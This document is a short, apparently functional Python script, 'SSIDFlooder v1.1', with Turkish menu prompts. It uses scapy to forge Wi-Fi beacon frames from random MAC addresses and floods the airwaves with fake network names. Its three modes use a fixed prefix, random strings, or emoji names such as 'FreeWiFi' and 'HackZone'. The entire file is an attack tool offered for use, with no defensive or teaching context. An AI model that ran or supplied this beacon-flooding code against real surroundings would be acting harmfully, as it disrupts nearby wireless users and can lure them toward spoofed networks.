#!/usr/bin/env python3
from scapy.all import *
import random
import time
import os

def random_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))

def beacon(ssid, mac, iface):
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
    beacon = Dot11Beacon(cap="ESS")
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    frame = RadioTap()/dot11/beacon/essid
    sendp(frame, iface=iface, inter=0.1, loop=0, verbose=0)

def sabit_ssid_yayini(iface):
    prefix = input("SSID ön eki girin (örnek: AhmetSec_): ")
    count = int(input("Kaç SSID yayınlansın?: "))
    for i in range(count):
        ssid = f"{prefix}{random.randint(1000,9999)}"
        mac = random_mac()
        beacon(ssid, mac, iface)
        print(f"\033[92m[✓] Yayınlandı:\033[0m {ssid} [{mac}]")
        time.sleep(0.05)

def rastgele_ssid_yayini(iface):
    count = int(input("Kaç rastgele SSID yayınlansın?: "))
    for i in range(count):
        ssid = ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=8))
        mac = random_mac()
        beacon(ssid, mac, iface)
        print(f"\033[94m[→] Yayınlandı:\033[0m {ssid} [{mac}]")
        time.sleep(0.05)

def chaos_modu(iface):
    chaos_list = ["🔥💀💥", "☠️_HackZone_☠️", "💣_FreeWiFi_💣", "👻_AhmetSec_👻", "🧨_SSIDFlood_🧨"]
    count = int(input("Kaç kaotik SSID yayınlansın?: "))
    for i in range(count):
        ssid = random.choice(chaos_list) + str(random.randint(100,999))
        mac = random_mac()
        beacon(ssid, mac, iface)
        print(f"\033[91m[✴] Yayınlandı:\033[0m {ssid} [{mac}]")
        time.sleep(0.05)

def menu(iface):
    while True:
        print("\n=== SSIDFlooder Terminal Arayüzü ===")
        print("1. Sabit SSID yayını")
        print("2. Rastgele SSID yayını")
        print("3. Emoji/ASCII kaos modu")
        print("4. Çıkış")
        secim = input("Seçiminizi girin (1-4): ")
        if secim == "1":
            sabit_ssid_yayini(iface)
        elif secim == "2":
            rastgele_ssid_yayini(iface)
        elif secim == "3":
            chaos_modu(iface)
        elif secim == "4":
            print("Çıkılıyor...")
            break
        else:
            print("Geçersiz seçim.")

def main():
    os.system("clear")
    print("SSIDFlooder v1.1 - Friday7772")
    iface = input("Monitor modda arayüzü girin (örnek: wlan0mon): ")
    menu(iface)

if __name__ == "__main__":
    main()
